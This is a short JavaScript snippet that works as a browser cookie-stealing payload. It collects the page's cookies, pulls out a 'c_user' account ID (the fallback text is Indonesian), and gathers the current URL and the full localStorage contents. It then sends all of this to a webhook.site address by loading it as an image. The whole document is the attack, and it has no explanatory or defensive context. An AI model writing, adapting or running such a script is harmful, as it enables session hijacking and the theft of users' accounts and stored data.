(function(){
    var data = '';
    data += 'COOKIES:\n' + document.cookie + '\n\n';
    data += 'USER ID:\n' + (document.cookie.match(/c_user=(\d+)/)||['','tidak ditemukan'])[1] + '\n\n';
    data += 'URL:\n' + window.location.href + '\n\n';
    data += 'LOCALSTORAGE:\n' + JSON.stringify(localStorage);
    
    var img = new Image();
    img.src = 'https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX?data=' + encodeURIComponent(data);
})();
